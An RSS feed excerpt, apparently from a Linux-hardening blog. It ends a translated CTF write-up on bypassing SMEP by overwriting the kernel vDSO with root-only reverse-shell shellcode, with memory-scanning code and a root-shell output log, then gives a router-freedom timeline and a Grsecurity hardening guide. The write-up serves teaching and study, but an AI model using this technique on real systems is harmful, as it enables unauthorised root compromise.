    &lt;span class=&quot;na&quot;&gt;vbase =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;vmap(vdso_pages,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;npages&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;PAGE_KERNEL&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;所以在内核空间中通过alloc_page分配了vDSO页，并且指针保存在了vdso_pages数组中。只有少数的几种方法能够定位这些页。如果能够读取/proc/kallsyms，你将能够通过vdso_pages直接获取这些地址。然而，这种情况在这次比赛不适用。第二种方法则是在内核空间中搜寻每一个页的开头，看是否有ELF头也出现了部分vDSO的映射。我们可以通过vDSO的标志(signatures)进一步缩小这些页的范围。下面是实现这个思路的代码：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;void* header = 0;
void* loc = 0xffffffff80000000;
size_t i = 0;
for (; loc&lt;span class=&quot;nt&quot;&gt;&amp;lt;0xffffffffffffafff&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;loc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;readMem&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;header=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;=0x010102464c457f)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&amp;quot;%&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;quot;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;readMem&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;0x270&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;err&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Look&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;clock_ge&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;signature&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;may&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;be&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;at&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;but&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;happened&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;header=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;=0x65675f6b636f6c63)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&amp;quot;%&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;found&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;?\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;quot;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;现在我们找到了vDSO所在的区域，我们就能用shellcode来覆盖它。&lt;/p&gt;

&lt;h2 id=&quot;shellcode&quot;&gt;反弹shellcode&lt;/h2&gt;

&lt;p&gt;此处用到的反弹shellcode和常见的x86-64 shellcode差不多，但有几个修改的地方。第一个修改为：只为root进程创建反弹shell。因为每一个调用gettimeofday的进程都会触发我们的shellcode，我们不需要那些没有root权限的进程的shell权限。我们可以通过调用 0x66(sys_getuid)系统调用并将其与0进行比较。如果没有root权限，我们继续调用0x66(sys_gettimeofday)系统调用，所以其他没有不相关的进程也不会受到太多影响。但同样在root进程当中，我们不想造成更多的问题，我们将通过0x39系统调用 fork一个子进程，父进程继续执行sys_gettimeofday，而由子进程来执行反弹shell。&lt;/p&gt;

&lt;p&gt;我所使用的shellcode的汇编代码可以在&lt;a href=&quot;https://gist.github.com/itsZN/1ab36391d1849f15b785&quot;&gt;这里&lt;/a&gt;。它将连接到127.0.0.1:3333并执行”/bin/sh”&lt;/p&gt;

&lt;p&gt;我们要做的最后一件事则是，dump vDSO并在gettimeofday所在的偏移处检查。只要我们知道我们可以在这个位置覆盖上shellcode，我们就可以在这等待某个进程进行调用。我设置了一个简单的cron任务来完成这个任务(root进程调用gettimeofday)。我最后的代码可以在&lt;a href=&quot;https://gist.github.com/itsZN/20144eb7beefbc301bcf&quot;&gt;这里&lt;/a&gt;找到。下面是程序运行的情况：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;csaw@team7:~$ id
uid=1000(csaw) gid=1000(csaw) groups=1000(csaw)
csaw@team7:~$ ./a.out 
allocate fd: 3 ret: 0 id:1
Shrink: 0 err:0
ZERO_SIZED_POINTER = 0x10
0xffffffff817bc000 elf
0xffffffff817d1000 elf
0xffffffff81b6c000 elf
0xffffffff81b9e000 elf
0xffffffff81c03000 elf
0xffffffff81c03000 found it?
Listening on [0.0.0.0] (family 0, port 3333)
Connection from [127.0.0.1] port 3333 [tcp/*] accepted (family 2, sport 58568)
id
uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&quot;final-notes&quot;&gt;Final Notes&lt;/h2&gt;

&lt;p&gt;vDSO不是唯一一个同时映射在内核空间和用户空间的内存。在x86-64当中,vSYSCALL与vDSO实现类是的功能，但多了一点特性就是每次重启都在同一个位置（可能可以通过内核版本进行预测）。然而 kernel.vsyscall64并没有在本次比赛启用，所以我们将通过vDSO来完成这个目的。如果vm.vdso_enable设置为0，vDSO也会被绕过并且libc的wrapper function会默认调用正常的系统调用。&lt;/p&gt;

&lt;p&gt;vDSO/vSYSCALL overwriting是一个非常有用的技术，它能够用在对于中断上下文(interrupt context)的利用，因为它不需要本地进程来映射一段内存，或者提升权限。&lt;/p&gt;

&lt;p&gt;在解决这个问题当中本文提到的解决思路也不是唯一的，另外一个解决思路可以在&lt;a href=&quot;https://github.com/mncoppola/StringIPC/blob/master/solution/solution.c&quot;&gt;这里&lt;/a&gt;找到&lt;/p&gt;
</description>
        <pubDate>Wed, 25 Nov 2015 11:30:02 +0800</pubDate>
        <link>http://www.hardenedlinux.org/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html</guid>
        
        
        <category>translation</category>
        
      </item>
    
      <item>
        <title>Timeline of compulsory routers</title>
        <description>&lt;p&gt;原文地址 &lt;a href=&quot;https://fsfe.org/activities/routers/timeline.en.html&quot;&gt;Timeline of compulsory routers&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Shawn: 德国今年通过了“路由器自由”的法案来保证所有的运营商必须允许用户自由的选择路由器进行接入，包括OpenWRT等自由软件实现。这一法案对保护用户的软件自由以及数字权利有促进作用，月初FSFE工作人员联系我们谈到希望有相关信息的中文翻译，之后h4rdenedzer0成员参与了翻译工作。&lt;/p&gt;

&lt;p&gt;By:n3o4po11o&lt;/p&gt;

&lt;p&gt;译者注:compulsory routers指在用户在使用通信运营商提供的接入互联网服务时，只能使用特定的路由。&lt;/p&gt;

&lt;p&gt;“compulsory routers”因为其过程非常复杂而成为一个非常有意思的话题。很多政府部门、公司和团体已经参与到了其中，热烈的参与了讨论和吸取意见。下面是FSFE（欧洲自由软件基金会）列出了推动“路由器自由”法案到现在这个阶段的重要里程碑，也可以展望“路由器自由”法案的未来&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;现在与未来&lt;/h2&gt;

&lt;p&gt;德国联邦经济和能源部(BMWi)修订之前的通信法案修订版的提案。来保证用户能够自由地选择路由器。我们评估后觉得该草案很大程度上起着积极的作用，因为它终于能够结束用户选择路由器进行接入时所受到的差别对待。只有一小部分措辞需要阐述得更加精确来提前避免法律漏洞。&lt;/p&gt;

&lt;p&gt;在7月之前，这个提案已经提交给欧盟委员会(EU commission)和成员国进行审批。据我们所得到的消息可以知道，在这个过程中只有一个有一&amp;gt;点点不严禁的地方受到修改。修正版本在8月中旬已经通过了德国联邦内阁的审查。在不久的将来这个草案将会送至德国联邦议院进行审查。我们祝愿联邦议员和代表们能够承受得住那些敌对势力(不希望该草案通过的那些人)的压力，能够捍卫和恢复互联网用户的权利。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;12.08.2015：德国联邦议会通过了”路由器自由”法案，对于FSFE来说这是一件好事。紧接在欧盟委员会7月8号发布通告和解释名词之后。在这个阶段只有一小部分措辞受到修改。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;25.02.2015：德国联邦经济和能源部发布了第一个禁止强制要求用户选择特定路由的法律草案。除了缺少强制措施以外FSFE还是很欢迎这个草案。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;29.09.2014：在经历了未来计划不清晰的一段漫长时期。Netzpolitik.org发布了一个transparency bill的内部修正草案。FSFE批评了这个草案，因为它从法律上使得用户放弃了选择的权力。而不是像三当联合声明那样，这个草案使得通信运营商有权利禁止用户使用其他设备进行接入。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;28.03.2014：和CCC还有其他项目还有专家们一起，FSFE赞扬德国联邦网络局发布的试行法案和详尽的声明，但明确的批评用户会增加负担以及提出的测试方案没有一致性的考虑。而最有意思的是，正式的条例本质上比三党联合声明更弱了，甚至没有指及“网络的终点”到底界限在那。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;24.02.2014：在第一个大型听众会之后，德国联邦网络局发布了一个“transparency     bill”，意在消除compulsory routers并要求通信运营商必须提升对用户的透明度。在14年3月底之前运营商应该执行这个意见（译者注：原文为Comments may be submitted until the end of March 2014.）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;16.12.2013：在11月底的德国联邦议院选举之后，德国CDU党、CSU党和SPD党的联合执政协议正式签署。他们三党都明确的表示反对compulsory routers并要求必须主动让每一个客户都收到所有需要的信息。这么高级别的联合体发表&amp;gt;的声明通过媒体的传播和科普使得民众们产生了巨大的兴趣。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;04.11.2013：紧接着公众听证会之后，FSFE通过和其他组织或者个体一样发送一个公开声明给德国联邦网络局。这个声明包含了几乎所有之前公开提出的问题的答案，并且特别对compulsory routers现在及可能存在的缺点表示担心。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;20.09.2013：德国联邦网络局发起了一次关于“网络的终点”的公众听证会。在听证会中，很多问题当中有着非常强的专业性而这些问题所涉及到的定义都被提及了，因为这些定义都直接与compulsory routers有关。几天过后FSFE发布了一个初步声明，在声明中表达了对安全、用户友好性以及竞争的严重关切。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;31.07.2013：在第二个“网络中立原则”草案中，在第三页讨论了compulsory routers，但和第一个草案相反的是，第二个草案使用了“terminal device net neutrality”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;25.06.2013：联邦网络局组织了一个针对”compulsory routers”的研讨会，并设计了4个用于议案的模型&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;17.06.2013：德国联邦经济和能源部提出网络中立原则的草案。在其中compulsory     router被特别标识出来并且反对。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;04.06.2013：德国联邦政府对5月17号的”minor interpellation”进行回复。在这个回复中，政府对待这些问题非常小心而且很负责。这样的态度或多或少的影响了德国联邦网络局。自从德国联邦网络局在这个话题当中还把重心放在网络运营商和路由制造商当中，德国联邦经济和能源部(BMWi)还没有考虑要参与到这个话题当中。一篇在Netzpolitik的文章全面的总结了这个事件。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;17.05.2013：社会主义者团体“DIE LINKE”发布了一篇“minor interpellation”给德国联邦政府，其内容是关于德国联邦网络局发表的一些声明。在文章中问到“路由是否有资格当作接入点或者电信设备”以及“用户到底能对其造成多大的影响”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;22.01.2013：此外还有德国通信设备制造商AVM评论了这个问题并举了“手机市场中通信服务的提供者没有指定用户必须使用什么手机”的例子&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;10.01.2013：关于讨论compulsory routers的根源可以追溯到“德国联邦网络局对一个匿名用户的评论”。这个用户批评他DSL合约绑定着一个特定型号的路由。他这样的反应使得一个个人杂志“PC-WELT”发布了一篇展开这个话题的文章。DSL运营商这样做法受到了批评。而德国联邦网络局觉得运营商这样的做法合乎情理，因为DSL运营商将路由器定义为其网络的一部分，所以这样的基础设施应该由运营商提供。因此，用户不能将其用其他设备来更换。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Sat, 03 Oct 2015 09:30:02 +0800</pubDate>
        <link>http://www.hardenedlinux.org/translation/2015/10/03/Translation-Timeline-of-compulsory-routers.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/translation/2015/10/03/Translation-Timeline-of-compulsory-routers.html</guid>
        
        
        <category>translation</category>
        
      </item>
    
      <item>
        <title>社区最佳实践：基于PaX/Grsecurity &amp; STIG &amp; Sheild针对es的Docker场景化加固</title>
        <description>&lt;p&gt;By: 炼石网络CipherGateway&lt;/p&gt;

&lt;h1 id=&quot;hardening-esin-docker-with-paxgrsecurity--stig--shield&quot;&gt;Hardening es(in docker) with PaX/Grsecurity &amp;amp; STIG &amp;amp; Shield&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;文档说明&lt;/strong&gt;：&lt;/p&gt;

&lt;p&gt;&lt;em&gt;基础平台&lt;/em&gt;：此实践文档使用&lt;a href=&quot;http://https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options#Disallow_access_to_overly-permissive_IPC_objects&quot;&gt;PaX/Grsecurity&lt;/a&gt;完成Linux内核级别的加固，并采用美国DISA组织的STIG脚本对Debian GNU/Linux发行版进行安全扫描，以使Debian GNU/Linux发行版安全达到一定的高度。&lt;/p&gt;

&lt;p&gt;&lt;em&gt;业务方面&lt;/em&gt;：以在Docker下运行的ElasticSearc服务为例，结合ES的&lt;a href=&quot;http://https://www.elastic.co/guide/en/shield/current/index.html&quot;&gt;Shield&lt;/a&gt;插件对ES进行业务级别的加固。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;基本步骤如下：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;1、最小化安装Debian8 GNU/Linux&lt;/p&gt;

&lt;p&gt;2、使用PaX/Grsecurity加固&lt;/p&gt;

&lt;p&gt;3、使用STIG验证&lt;/p&gt;

&lt;p&gt;4、使用Shield对ElasticSearch进行业务级别的加固&lt;/p&gt;

&lt;p&gt;5、完善物理机RBAC系统，达到最小权限要求&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;debian8-gnulinux&quot;&gt;1、最小化安装Debian8 GNU/Linux系统&lt;/h2&gt;

&lt;p&gt;1）在服务器上插入U盘，连接好网线，配置网络：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/Y8ZBvBJ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2）为硬盘分区：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/omVXCcF.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;3）软件环境安装：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/GV5UIz9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/sHqiWQv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;4）系统安装完成：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/zBfEUEQ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;section&quot;&gt;加固前准备&lt;/h3&gt;

&lt;p&gt;1）在root下打开/etc/apt/sources.list，确定是否有以下三个debian的源，若没有自行添加,并且注释或删掉其他的软件源，尽量避免使用非社区源：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;nano /etc/apt/sources.list
deb http://ftp.debian.org/debian jessie main contrib
deb http://security.debian.org/jessie/updates main contrib
deb http://ftp.debian.org/debian jessie-updates main contrib

apt-get update
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2）安装sudo&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get install sudo
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;修改sudoers文件，添加一句（等效于添加当前用户到sudo用户组，或者直接使用root用户可忽略此步）:   &lt;/p&gt;

&lt;pre&gt;&lt;code&gt; nano /etc/sudoers
 add &quot;user   ALL=(ALL:ALL)ALL&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3）安装make&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo apt-get install make
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;paxgrsecurity&quot;&gt;2、使用PaX/Grsecurity加固&lt;/h2&gt;

&lt;p&gt;这次加固主要用到的是一个增强内核安全的工具Grsecurity，和SELinux以及Apparmor一样，是用来控制文件访问权限的安全工具。&lt;/p&gt;

&lt;p&gt;1）Grsecurity需要打包到内核，所以需要重新编译内核，由于grsec长期支持的内核版本是3.14.48，而debian8的内核版本是3.16，所以我们要将内核版本降到3.14.48，查看内核版本命令:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cat /proc/version
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2）到kernel.org下载相应的目标内核版本源代码:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; wget https://kernel.org/pub/linux/kernel/v3.x/linux-3.14.48.tar.xz
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3)到Grsecurity下载相应的patch，注意必须要和内核版本一致(先到http://grsecurity.net/download.php查看“grsecurity - stable kernel patch”和“paxctld - PaX flags maintenance daemon - binary packages”的版本):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; wget http://grsecurity.net/stable/grsecurity-3.1-3.14.48-201507261203.patch
 wget http://grsecurity.net/paxctld/paxctld_1.0-2_amd64.deb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4）编译前安装支持插件的gcc：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; apt-get install libncurses* kernel-package build-essential
 gcc --version
 apt-get install gcc-`gcc --version`-plugin-dev（gcc --version用大版本即可 例如4.9而不是4.9.2）
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;5）解压缩内核包和补丁包，给内核打patch:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;xz -d linux-3.14.48.tar.xz
tar -xvf linux-3.14.48.tar
cd linux-3.14.48/
patch -p1 &amp;lt; ../grsecurity-3.1-3.14.48-201507261203.patch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6）配置内核：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;make menuconfig
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;grsecurity&quot;&gt;开始配置Grsecurity选项&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;Note：该文档的配置选项仅测试在Debian8 GNU/Linux中。（业务：启动docker，并在其中运行ElasticSearch服务）&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;关于Grsecurity具体的配置选项请参照：&lt;a href=&quot;https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options&quot;&gt;https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;7)开启Grsecurity支持&lt;/p&gt;

&lt;p&gt;执行命令后会出现配置窗口：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;在配置界面按下键盘选择&quot;security options&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/HGIQswO.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;security options --&amp;gt; Grsecurity
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/CYR2XEe.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;按空格选上Grsecurity(NEW)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/RW83QSo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/w85poOM.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;8）选择automatic后Grsecurity将自动根据通用标准形成一系列配置，但仍可在
Customer Configuration中进行更细致的加固措施的划分，二者效果会叠加。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Configuration Method --&amp;gt;选择 automatic
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/GYO41kc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;9）优先选项选择Security优先&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Required Priority--&amp;gt;Security
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/d8c6c741jw1evo9ufrg99j20ke0cajth.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;10）去掉mprotect限制。因为Grsecurity默认禁止mprotect功能，而这会使JVM无法运行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Security Options --&amp;gt;Grsecurity --&amp;gt;customize configuration --&amp;gt;PAX --&amp;gt;Nonexcutable pages--&amp;gt;disable  restrict mprotect
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/d8c6c741jw1ev1140ill5j20ll0dqwhl.jpg&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;http://ww1.sinaimg.cn/large/d8c6c741jw1ev115fx6koj20lr0dogog.jpg&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;http://ww4.sinaimg.cn/large/d8c6c741jw1ev1166ekopj20lq0dg77k.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;11）为了docker能正常运行，去掉chroot下’chmod+s’和’mknod’的限制&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Security Options --&amp;gt;Grsecurity --&amp;gt;customize configuration --&amp;gt;FileSystem Protections--&amp;gt;Deny (f)chmod +s &amp;amp;&amp;amp; Deny mknod
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/d8c6c741jw1evo9ux6odcj20ke0cewhz.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;12)去除USB限制（看业务需求）&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Security Options --&amp;gt;Grsecurity --&amp;gt;customize configuration --&amp;gt;Physical Protections--&amp;gt;Deny new USB connections after toggle
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/d8c6c741jw1evo9vgclhoj20kh0cadil.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;13)其余选项保持默认，Save之后退出内核配置窗口。&lt;/p&gt;

&lt;p&gt;14)完成之后执行编译内核命令，这一步需要较长时间&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;make deb-pkg -j&#39;cpu核心数+1&#39; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;15）编译之后安装：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cd ..
dpkg -i linux*.deb 
dpkg -i paxctld_1.0-2_amd64.deb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;16）安装完成重启即可，重启时选择新内核&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;paxctld -d
sudo reboot
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在启动界面选择高级选项&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/d8c6c741jw1evrj57c193j20iv0dwwgu.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;选择已加固的内核&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/d8c6c741jw1evrj6wg06dj20ii0dxad7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;17) 重启之后&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;su - root
paxctld -d
exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;18)安装&lt;a href=&quot;https://en.wikibooks.org/wiki/Grsecurity/The_Administration_Utility&quot;&gt;gradm&lt;/a&gt;工具&lt;/p&gt;

&lt;p&gt;&lt;em&gt;这是RBAC系统的管理工具，使用它可以配置/etc/policy规则文件来定义每个用户的权限，也可通过gradm的学习模式来自动生成policy文件。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note：安装gradm之前必须保证在已有Grsecurity加固的内核上，并且系统有（lex或flex）和（byacc或bison）&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;下载相应的组件：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get install flex
apt-get install bison
